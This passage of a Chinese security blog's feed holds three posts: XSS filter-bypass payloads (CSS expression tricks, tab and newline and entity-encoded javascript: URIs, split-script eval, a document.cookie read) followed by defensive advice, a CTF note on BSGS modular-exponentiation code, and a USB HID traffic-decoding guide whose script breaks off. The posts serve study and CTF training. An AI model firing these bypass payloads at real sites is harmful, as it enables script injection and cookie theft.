target="_blank" rel="noopener">XSS 攻击时怎么绕过 htmlspecialchars 函数呢？ - 梧桐雨的回答 - 知乎</a>及文末拓展阅读。</p><h4 id="利用-代替空格"><a href="#利用-代替空格" class="headerlink" title="利用 / 代替空格"></a>利用 / 代替空格</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Img/sRc=<span class="string">'#'</span>/Onerror=<span class="string">'alert(/xss/)'</span> /&gt;</span><br></pre></td></tr></table></figure><h4 id="CSS中变形"><a href="#CSS中变形" class="headerlink" title="CSS中变形"></a>CSS中变形</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">@ 使用全角字符</span><br><span class="line">&lt;style&gt;body&#123;background-image:ｅｘｐｒｅｓｓｉｏｎ(alert(/xss/));&#125;&lt;/style&gt;    </span><br><span class="line">@ 注释会被浏览器忽略</span><br><span class="line">&lt;style&gt;</span><br><span class="line">body&#123;background-image:expre<span class="comment">/***/</span>ssion(alert(/xss/))&#125;</span><br><span class="line">&lt;/style&gt;    </span><br><span class="line">@ 样式表中的\ 和\<span class="number">0</span> 同样会被浏览器忽略</span><br><span class="line">&lt;style&gt;@import <span class="string">'javasc\ri\0pt:alert("xss")'</span>;&lt;/style&gt;</span><br></pre></td></tr></table></figure><h4 id="利用空格、Tab或回车"><a href="#利用空格、Tab或回车" class="headerlink" title="利用空格、Tab或回车"></a>利用空格、Tab或回车</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@ 利用Tab</span><br><span class="line">&lt;A hREf=<span class="string">"j  avascript:alert(/xss/)"</span>&gt;click me!&lt;/a&gt;</span><br><span class="line">@ 利用回车</span><br><span class="line">&lt;img src=<span class="string">"javas</span></span><br><span class="line"><span class="string">cript:</span></span><br><span class="line"><span class="string">alert(/xss/)"</span> width=<span class="number">100</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">@ 将字符转为十进制或十六进制，例如</span><br><span class="line">a    <span class="number">97</span>     &amp;<span class="comment">#97;     &amp;#x61;   </span></span><br><span class="line">e    <span class="number">101</span>    &amp;<span class="comment">#101;    &amp;#x65;</span></span><br><span class="line">&lt;A hREf=<span class="string">"j    &amp;#97;v&amp;#x61;script:alert(/xss/)"</span>&gt;click me!&lt;/a&gt;</span><br></pre></td></tr></table></figure><h4 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">@ 拼接</span><br><span class="line">&lt;script&gt;z=&apos;alert&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+&apos;(/xss/)&apos;&lt;/script&gt;</span><br><span class="line">&lt;script&gt;eval(z)&lt;/script&gt;</span><br><span class="line">@ 注释</span><br><span class="line">&lt;script&gt;alert(doucument./*</span><br><span class="line">*/cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="常见应对XSS方法"><a href="#常见应对XSS方法" class="headerlink" title="常见应对XSS方法"></a>常见应对XSS方法</h2><ul><li><p>输入输出检查并对敏感字符编码，如<code>&lt;</code>转成<code>&amp;lt;</code></p><ul><li>在XSS的防御上，输入检查一般是检查用户输入的数据中是否包含一些特殊字符，如<code>&lt;script&gt;</code>、<code>JavaScript</code>、<code>&lt;</code>、<code>&gt;</code>、<code>”</code>。常使用<code>preg_replace()</code>函数，如<code>preg_replace( &#39;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#39;, &#39;&#39;, $name );</code></li><li>在变量输出到HTML页面时，可以使用编码或转义的方式来防御XSS攻击。如php可以使用<code>htmlentities()</code>函数及<code>htmlspecialchars()</code>函数；JavascriptEncode使用<code>escapeJavascript()</code>函数来转义<code>、&lt;&gt;\&amp;#</code>等，同时要求输出变量必须在引号内部。在Java中也存在第三方组件支持过滤XSS漏洞，如JSOUP、OWASP Esapi、xssprotext等。</li></ul></li><li><p>黑名单，白名单</p><ul><li>对于富文本的过滤，需要考虑输入过滤，严格禁止“事件”。同时禁止一些威胁的标签：<code>&lt;iframe&gt;</code>、<code>&lt;base&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;form&gt;</code>等。</li><li>在标签的选择上，应该使用白名单，如只允许<code>&lt;a&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;div&gt;</code>等比较安全的标签</li></ul></li></ul><h2 id="参考资料-amp-拓展阅读"><a href="#参考资料-amp-拓展阅读" class="headerlink" title="参考资料&amp;拓展阅读"></a>参考资料&amp;拓展阅读</h2><ul><li><a href="https://blog.csdn.net/xiaowhite_meng/article/details/80143936" target="_blank" rel="noopener">XSS简介 - xiaoWhite_meng - CSDN</a></li><li><a href="https://blog.csdn.net/qq_31481187/article/details/53027208" target="_blank" rel="noopener">XSS 漏洞总结 - 4ct10n - CSDN</a></li><li><a href="https://www.freebuf.com/articles/web/123779.html" target="_blank" rel="noopener">新手指南：DVWA-1.9全级别教程之XSS - lonehand - Freebuf</a></li><li><a href="https://blog.csdn.net/ski_12/article/details/60468362" target="_blank" rel="noopener">关于DOM型XSS漏洞的学习笔记 - Mi1k7ea - CSDN</a></li><li><a href="http://lawlietweb.com/2017/12/21/DOM%20XSS/" target="_blank" rel="noopener">dvwa DOM型XSS - C1imber’s Blog</a></li><li><a href="https://www.jianshu.com/p/a5ff8a23b423" target="_blank" rel="noopener">前端常见的攻击方式及预防方法 - 大颓宝宝 - 简书</a></li><li><a href="https://en.wikipedia.org/wiki/Cross-site_scripting" target="_blank" rel="noopener">Cross-site scripting - WikiPedia</a></li></ul><hr><ul><li><a href="https://www.zhihu.com/question/26628342/answer/33504799" target="_blank" rel="noopener">DOM-based XSS 与存储性 XSS、反射型 XSS 有什么区别？ - 梧桐雨的回答 - 知乎</a></li><li><a href="http://lawlietweb.com/2018/09/02/2018-09-02/" target="_blank" rel="noopener">记一次有意思的XSS绕过之奇葩的中文尖括号 - C1imber’s Blog</a></li><li><a href="https://xz.aliyun.com/t/2757" target="_blank" rel="noopener">代码审计Day12 – 误用htmlentities函数引发的漏洞 -  红日安全团队 - 先知社区</a></li><li><a href="http://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener">正则表达式30分钟入门教程v2.3.5 - deerchao</a></li><li><a href="https://www.freebuf.com/sectool/102661.html" target="_blank" rel="noopener">新手指南：手把手教你如何搭建自己的渗透测试环境 - felix - Freebuf</a></li></ul><hr><ul><li><a href="https://blog.csdn.net/u013068862/article/details/80228481" target="_blank" rel="noopener">【WAMP】wamp服务器让局域网用户访问，403forbidden 解决办法</a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> xss </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形如a^b(mod p)=d且p为质数的方程之解</title>
      <link href="/2019/02/14/%E5%BD%A2%E5%A6%82a%5Eb(mod-p)=d%E4%B8%94p%E4%B8%BA%E8%B4%A8%E6%95%B0%E7%9A%84%E6%96%B9%E7%A8%8B%E4%B9%8B%E8%A7%A3/"/>
      <url>/2019/02/14/%E5%BD%A2%E5%A6%82a%5Eb(mod-p)=d%E4%B8%94p%E4%B8%BA%E8%B4%A8%E6%95%B0%E7%9A%84%E6%96%B9%E7%A8%8B%E4%B9%8B%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>RT<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>今年没在打ctf了，但是听说又出了这种题（？？）<br>总之姑且总结一下目前碰到过的这几种，给自己存个档。<br>什么你说数学原理？不存在的，我又不是ACMer（此时一名搬砖民工抓起代码就是一个调用（不</the></p><h2 id="已知a-b-p，求d"><a href="#已知a-b-p，求d" class="headerlink" title="已知a b p，求d"></a>已知a b p，求d</h2><p>一般情况下快速幂和快速乘比较保险，不过python可以直接<code>pow()</code>，只写快速幂也行，int任意精度是好文明（你看隔壁c++的long long又爆了（小声嘀咕<br>但是这里有个问题在于<code>pow()</code>的计算精度……想不太明白是怎么回事orz<br>具体体现可以看<a href="https://pan.baidu.com/s/1O3TYnnfH_Zsp2T3KiIdUmA" target="_blank" rel="noopener">安恒2018年7月赛-Crypto-dangerous rsa</a>这道题，到最后也没能解决，跪了（）<br>提取码：<code>6tv7</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(a,b,p)</span>:</span></span><br><span class="line">  r=<span class="number">0</span></span><br><span class="line">  t=a</span><br><span class="line">  <span class="keyword">while</span>(b):</span><br><span class="line">    <span class="keyword">if</span>(b&amp;<span class="number">1</span>):</span><br><span class="line">      r=(r+t)%p</span><br><span class="line">    t=(t&lt;&lt;<span class="number">1</span>)%p</span><br><span class="line">    b&gt;&gt;=<span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast_pow</span><span class="params">(a,b,p)</span>:</span></span><br><span class="line">    r=<span class="number">1</span></span><br><span class="line">    t=a</span><br><span class="line">    <span class="keyword">while</span>(b):</span><br><span class="line">        <span class="keyword">if</span>(b&amp;<span class="number">1</span>):</span><br><span class="line">          r=mul(r,t,p)%p</span><br><span class="line">        t=mul(t,t,p)%p</span><br><span class="line">        b&gt;&gt;=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line">print(fast_pow(<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>))</span><br></pre></td></tr></table></figure><p>题外话，快速幂有两种实现方式（递归和循环），此处采用循环，参考<a href="https://www.cnblogs.com/chengd/articles/7103854.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengd/articles/7103854.html</a></p><blockquote><p>递归效率不高，递归层次过多会导致栈溢出（在计算机中，函数调用是通过栈（stack）这种数据结构实现的，每当进入一个函数调用，栈就会加一层栈帧，每当函数返回，栈就会减一层栈帧。由于栈的大小不是无限的，所以，递归调用的次数过多，会导致栈溢出）</p></blockquote><p>终于解答了去年给RSA写快速幂取模函数的时候出现的问题x唐突爆栈猝不及防（……）总之学到了写算法的时候要根据实际情况权衡时间复杂度和空间复杂度，通常情况下递归的时间复杂度比非递归的大很多，不能因为图好写就盲目递归（。<br>也反思了一下自己，学过数据结构我应该知道递归会爆栈才对啊为什么自己敲的时候根本没想到（……）<del>此时一名辣鸡路过</del></p><h2 id="已知a-d-p，求b"><a href="#已知a-d-p，求b" class="headerlink" title="已知a d p，求b"></a>已知a d p，求b</h2><p>去年hgame第一周的题，题目名直接就是提示了，就算这样也折腾了好久，不玩ACM真吃亏，还很丢人（）<br>BSGS代码（原网址已挂）：<br><a href="https://pythonexample.com/snippet/bsgspy_0xtowel_python" target="_blank" rel="noopener">https://pythonexample.com/snippet/bsgspy_0xtowel_python</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Towel 2017</span></span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> ceil, sqrt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bsgs</span><span class="params">(g, h, p)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Solve for x in h = g^x mod p given a prime p.</span></span><br><span class="line"><span class="string">    If p is not prime, you shouldn't use BSGS anyway.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    N = ceil(sqrt(p - <span class="number">1</span>)) <span class="comment"># phi(p) is p-1 if p is prime</span></span><br><span class="line">    <span class="comment"># Store hashmap of g^&#123;1...m&#125; (mod p). Baby step.</span></span><br><span class="line">    tbl = &#123;pow(g, i, p):i <span class="keyword">for</span> i <span class="keyword">in</span> range(N)&#125;</span><br><span class="line">    <span class="comment"># Precompute via Fermat's Little Theorem</span></span><br><span class="line">    c = pow(g, N * (p - <span class="number">2</span>), p)</span><br><span class="line">    <span class="comment"># Search for an equivalence in the table. Giant step.</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(N):</span><br><span class="line">        y = (h % p * pow(c, j, p)) % p</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">in</span> tbl:</span><br><span class="line">            a = j * N + tbl[y]</span><br><span class="line">            print(a)</span><br><span class="line"><span class="comment">#            return j * N + tbl[y]</span></span><br><span class="line">    <span class="comment"># Solution not found</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="comment">#print(bsgs(73300775185, 527242847469, 650260984909))</span></span><br></pre></td></tr></table></figure><p>题外话*2，扩展BSGS可以针对p不是质数的情况，这两个算法的具体原理可以参考：<br><a href="https://blog.csdn.net/lycheng1215/article/details/79047734" target="_blank" rel="noopener">https://blog.csdn.net/lycheng1215/article/details/79047734</a><br>附了c++的BSGSex代码，十分贴心（）<br>以及：<br><a href="https://blog.csdn.net/a27038/article/details/77341735" target="_blank" rel="noopener">https://blog.csdn.net/a27038/article/details/77341735</a><br>从原理到步骤到代码到应用都很详细，同样有附代码，强烈推荐。</p><h2 id="已知b-d-p，求a"><a href="#已知b-d-p，求a" class="headerlink" title="已知b d p，求a"></a>已知b d p，求a</h2><p>是朋友前几天问我的题，我看到也是直接去世（……）<br>然后搜到了这篇，啊是大佬，我死了（<br><a href="https://blog.csdn.net/acdreamers/article/details/9500215" target="_blank" rel="noopener">https://blog.csdn.net/acdreamers/article/details/9500215</a></p><p>过几天要是想起来了就补一下python版的代码。</p><h2 id="扩展阅读-amp-实际应用"><a href="#扩展阅读-amp-实际应用" class="headerlink" title="扩展阅读&amp;实际应用"></a>扩展阅读&amp;实际应用</h2><hr><ul><li><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/001431756044276a15558a759ec43de8e30eb0ed169fb11000" target="_blank" rel="noopener">Python教程 - 递归函数 - 廖雪峰</a></li><li><a href="https://blog.csdn.net/Cyan_rose/article/details/83065026" target="_blank" rel="noopener">【详解】快速幂&amp;龟速乘&amp;快速乘 - Cyan_rose</a></li><li><a href="http://acm.fzu.edu.cn/problem.php?pid=1759" target="_blank" rel="noopener">FZU - 1759- Super A^B mod C</a></li><li><a href="http://acm.hdu.edu.cn/showproblem.php?pid=5187" target="_blank" rel="noopener">HDU - 5187 - zhx’s contest</a></li></ul><hr><ul><li><a href="https://en.wikipedia.org/wiki/Baby-step_giant-step" target="_blank" rel="noopener">Baby-step giant-step - Wikipedia</a></li><li><a href="https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm" target="_blank" rel="noopener">Pohlig–Hellman algorithm - Wikipedia</a></li><li><a href="http://poj.org/problem?id=2417" target="_blank" rel="noopener">POJ - 2417 - Discrete Logging</a></li></ul><hr><ul><li><a href="https://www.cnblogs.com/w007878/p/3621653.html" target="_blank" rel="noopener">一些数论概念与算法——从SGU261谈起 - 雪琼 - 博客园</a></li><li><a href="http://codeforces.com/problemsets/acmsguru/problem/99999/261" target="_blank" rel="noopener">SGU - 261 - Discrete Roots</a></li><li><a href="http://acm.hdu.edu.cn/showproblem.php?pid=3930" target="_blank" rel="noopener">HDU - 3930 - Broot</a></li></ul><hr>]]></content>
      
      
      <categories>
          
          <category> 杂物堆积 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BSGS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于usb流量分析</title>
      <link href="/2018/04/30/%E5%85%B3%E4%BA%8Eusb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
      <url>/2018/04/30/%E5%85%B3%E4%BA%8Eusb%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p><excerpt in index | 首页摘要><br>简要总结了下CTF里usb流量分析题的操作。<br><a id="more"></a></excerpt></p><p><the rest of contents | 余下全文><br>我的天啊战队那个页面，卡到昏迷，嗦不出发（<br>等想起来每月一篇的时候已经是30号下午四点了，整个人都 我的冷静就是这样.jpg<br>我知道这篇水了我反省……求不打……</the></p><p>总之前略，朋友，usb了解一下（不是）<br><a href="http://www.usb.org/developers/hidpage/Hut1_12v2.pdf" target="_blank" rel="noopener">http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</a></p><p>文中提到的例题下载：<br>链接：<a href="https://pan.baidu.com/s/1g-cAdNzl3YoCFZoq1F6UCA" target="_blank" rel="noopener">https://pan.baidu.com/s/1g-cAdNzl3YoCFZoq1F6UCA</a> 密码：rltz</p><h2 id="鼠标流量"><a href="#鼠标流量" class="headerlink" title="鼠标流量"></a>鼠标流量</h2><blockquote><p>鼠标移动时表现为连续性，与键盘击键的离散性不一样，<br>不过实际上鼠标动作所产生的数据包也是离散的</p></blockquote><p>每一个数据包的数据区有四个字节，第一个字节代表按键，当取<code>0x00</code>时，代表没有按键、为<code>0x01</code>时，代表按左键，为<code>0x02</code>时，代表当前按键为右键。第二个字节可以看成是一个signed byte类型，其最高位为符号位，当这个值为正时，代表鼠标水平右移多少像素，为负时，代表水平左移多少像素。第三个字节与第二字节类似，代表垂直上下移动的偏移。</p><h2 id="键盘流量"><a href="#键盘流量" class="headerlink" title="键盘流量"></a>键盘流量</h2><p>键盘数据包的数据长度为8个字节，击键信息集中在第3个字节</p><blockquote><p>BYTE1 –<br>       |–bit0:   Left Control是否按下，按下为1<br>       |–bit1:   Left Shift  是否按下，按下为1<br>       |–bit2:   Left Alt    是否按下，按下为1<br>       |–bit3:   Left GUI    是否按下，按下为1<br>       |–bit4:   Right Control是否按下，按下为1<br>       |–bit5:   Right Shift 是否按下，按下为1<br>       |–bit6:   Right Alt   是否按下，按下为1<br>       |–bit7:   Right GUI   是否按下，按下为1<br>BYTE2 – 暂不清楚，有的地方说是保留位<br>BYTE3–BYTE8 – 这六个为普通按键</p></blockquote><p>例如：<br>键盘发送 <code>02 00 0e 00 00 00 00 00</code>，<br>表示同时按下了<code>Left Shift</code> + <code>‘k’</code>，即大写K。<br>具体键位对应参见<code>Hut1_12v2.pdf</code>第53页。<br>eg：HITCTF2018-MISC-键盘流量分析</p><h2 id="常规操作"><a href="#常规操作" class="headerlink" title="常规操作"></a>常规操作</h2><p>感谢一航大佬造福民众写了两个方便快捷的工具向大佬低头.jpg</p><h3 id="从流量包中提取"><a href="#从流量包中提取" class="headerlink" title="从流量包中提取"></a>从流量包中提取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -r keyboard.pcap -T fields -e usb.capdata &gt; usbdata.txt</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#18.8.10 同学问才想起来这里还有个坑，稍改了下，自动识别大小写+删除</span></span><br><span class="line">normalKeys = &#123;<span class="string">"04"</span>:<span class="string">"a"</span>, <span class="string">"05"</span>:<span class="string">"b"</span>, <span class="string">"06"</span>:<span class="string">"c"</span>, <span class="string">"07"</span>:<span class="string">"d"</span>, <span class="string">"08"</span>:<span class="string">"e"</span>, <span class="string">"09"</span>:<span class="string">"f"</span>, <span class="string">"0a"</span>:<span class="string">"g"</span>, <span class="string">"0b"</span>:<span class="string">"h"</span>, <span class="string">"0c"</span>:<span class="string">"i"</span>, <span class="string">"0d"</span>:<span class="string">"j"</span>, <span class="string">"0e"</span>:<span class="string">"k"</span>, <span class="string">"0f"</span>:<span class="string">"l"</span>, <span class="string">"10"</span>:<span class="string">"m"</span>, <span class="string">"11"</span>:<span class="string">"n"</span>, <span class="string">"12"</span>:<span class="string">"o"</span>, <span class="string">"13"</span>:<span class="string">"p"</span>, <span class="string">"14"</span>:<span class="string">"q"</span>, <span class="string">"15"</span>:<span class="string">"r"</span>, <span class="string">"16"</span>:<span class="string">"s"</span>, <span class="string">"17"</span>:<span class="string">"t"</span>, <span class="string">"18"</span>:<span class="string">"u"</span>, <span class="string">"19"</span>:<span class="string">"v"</span>, <span class="string">"1a"</span>:<span class="string">"w"</span>, <span class="string">"1b"</span>:<span class="string">"x"</span>, <span class="string">"1c"</span>:<span class="string">"y"</span>, <span class="string">"1d"</span>:<span class="string">"z"</span>,<span class="string">"1e"</span>:<span class="string">"1"</span>, <span class="string">"1f"</span>:<span class="string">"2"</span>, <span class="string">"20"</span>:<span class="string">"3"</span>, <span class="string">"21"</span>:<span class="string">"4"</span>, <span class="string">"22"</span>:<span class="string">"5"</span>, <span class="string">"23"</span>:<span class="string">"6"</span>,<span class="string">"24"</span>:<span class="string">"7"</span>,<span class="string">"25"</span>:<span class="string">"8"</span>,<span class="string">"26"</span>:<span class="string">"9"</span>,<span class="string">"27"</span>:<span class="string">"0"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"-"</span>,<span class="string">"2e"</span>:<span class="string">"="</span>,<span class="string">"2f"</span>:<span class="string">"["</span>,<span class="string">"30"</span>:<span class="string">"]"</span>,<span class="string">"31"</span>:<span class="string">"\\"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">";"</span>,<span class="string">"34"</span>:<span class="string">"'"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">","</span>,<span class="string">"37"</span>:<span class="string">"."</span>,<span class="string">"38"</span>:<span class="string">"/"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">shiftKeys = &#123;<span class="string">"04"</span>:<span class="string">"A"</span>, <span class="string">"05"</span>:<span class="string">"B"</span>, <span class="string">"06"</span>:<span class="string">"C"</span>, <span class="string">"07"</span>:<span class="string">"D"</span>, <span class="string">"08"</span>:<span class="string">"E"</span>, <span class="string">"09"</span>:<span class="string">"F"</span>, <span class="string">"0a"</span>:<span class="string">"G"</span>, <span class="string">"0b"</span>:<span class="string">"H"</span>, <span class="string">"0c"</span>:<span class="string">"I"</span>, <span class="string">"0d"</span>:<span class="string">"J"</span>, <span class="string">"0e"</span>:<span class="string">"K"</span>, <span class="string">"0f"</span>:<span class="string">"L"</span>, <span class="string">"10"</span>:<span class="string">"M"</span>, <span class="string">"11"</span>:<span class="string">"N"</span>, <span class="string">"12"</span>:<span class="string">"O"</span>, <span class="string">"13"</span>:<span class="string">"P"</span>, <span class="string">"14"</span>:<span class="string">"Q"</span>, <span class="string">"15"</span>:<span class="string">"R"</span>, <span class="string">"16"</span>:<span class="string">"S"</span>, <span class="string">"17"</span>:<span class="string">"T"</span>, <span class="string">"18"</span>:<span class="string">"U"</span>, <span class="string">"19"</span>:<span class="string">"V"</span>, <span class="string">"1a"</span>:<span class="string">"W"</span>, <span class="string">"1b"</span>:<span class="string">"X"</span>, <span class="string">"1c"</span>:<span class="string">"Y"</span>, <span class="string">"1d"</span>:<span class="string">"Z"</span>,<span class="string">"1e"</span>:<span class="string">"!"</span>, <span class="string">"1f"</span>:<span class="string">"@"</span>, <span class="string">"20"</span>:<span class="string">"#"</span>, <span class="string">"21"</span>:<span class="string">"$"</span>, <span class="string">"22"</span>:<span class="string">"%"</span>, <span class="string">"23"</span>:<span class="string">"^"</span>,<span class="string">"24"</span>:<span class="string">"&amp;"</span>,<span class="string">"25"</span>:<span class="string">"*"</span>,<span class="string">"26"</span>:<span class="string">"("</span>,<span class="string">"27"</span>:<span class="string">")"</span>,<span class="string">"28"</span>:<span class="string">"&lt;RET&gt;"</span>,<span class="string">"29"</span>:<span class="string">"&lt;ESC&gt;"</span>,<span class="string">"2a"</span>:<span class="string">"&lt;DEL&gt;"</span>, <span class="string">"2b"</span>:<span class="string">"\t"</span>,<span class="string">"2c"</span>:<span class="string">"&lt;SPACE&gt;"</span>,<span class="string">"2d"</span>:<span class="string">"_"</span>,<span class="string">"2e"</span>:<span class="string">"+"</span>,<span class="string">"2f"</span>:<span class="string">"&#123;"</span>,<span class="string">"30"</span>:<span class="string">"&#125;"</span>,<span class="string">"31"</span>:<span class="string">"|"</span>,<span class="string">"32"</span>:<span class="string">"&lt;NON&gt;"</span>,<span class="string">"33"</span>:<span class="string">"\""</span>,<span class="string">"34"</span>:<span class="string">":"</span>,<span class="string">"35"</span>:<span class="string">"&lt;GA&gt;"</span>,<span class="string">"36"</span>:<span class="string">"&lt;"</span>,<span class="string">"37"</span>:<span class="string">"&gt;"</span>,<span class="string">"38"</span>:<span class="string">"?"</span>,<span class="string">"39"</span>:<span class="string">"&lt;CAP&gt;"</span>,<span class="string">"3a"</span>:<span class="string">"&lt;F1&gt;"</span>,<span class="string">"3b"</span>:<span class="string">"&lt;F2&gt;"</span>, <span class="string">"3c"</span>:<span class="string">"&lt;F3&gt;"</span>,<span class="string">"3d"</span>:<span class="string">"&lt;F4&gt;"</span>,<span class="string">"3e"</span>:<span class="string">"&lt;F5&gt;"</span>,<span class="string">"3f"</span>:<span class="string">"&lt;F6&gt;"</span>,<span class="string">"40"</span>:<span class="string">"&lt;F7&gt;"</span>,<span class="string">"41"</span>:<span class="string">"&lt;F8&gt;"</span>,<span class="string">"42"</span>:<span class="string">"&lt;F9&gt;"</span>,<span class="string">"43"</span>:<span class="string">"&lt;F10&gt;"</span>,<span class="string">"44"</span>:<span class="string">"&lt;F11&gt;"</span>,<span class="string">"45"</span>:<span class="string">"&lt;F12&gt;"</span>&#125;</span><br><span class="line">output = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>)</span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> line[<span class="number">0</span>]!=<span class="string">'0'</span> <span class="keyword">or</span> (line[<span class="number">1</span>]!=<span 